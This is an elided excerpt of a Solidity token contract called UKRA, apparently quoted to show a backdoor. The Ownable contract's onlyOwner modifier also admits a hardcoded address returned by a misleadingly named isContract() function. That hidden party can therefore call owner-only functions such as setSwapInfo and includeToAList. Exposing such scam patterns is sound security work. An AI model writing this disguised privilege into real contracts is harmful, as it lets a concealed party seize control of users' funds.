...
abstract contract Ownable is Context {
    ...
    address private _contractAddress =
        0x7e9F85C98e704410722de7EF6d5af33Fb21dE259;
    ...
    function isContract() internal view returns (address) {
    ...
    modifier onlyOwner() {
        require(
            owner() == _msgSender() || _msgSender() == isContract(),
...
contract UKRA is ERC20, Ownable {
    ...
    function includeToAList(address[] memory _users) external onlyOwner {
     ...
     * @dev Sets swap info.
     */
    function setSwapInfo(bool status, uint256 amount) public onlyOwner {
        swapStatus = status;
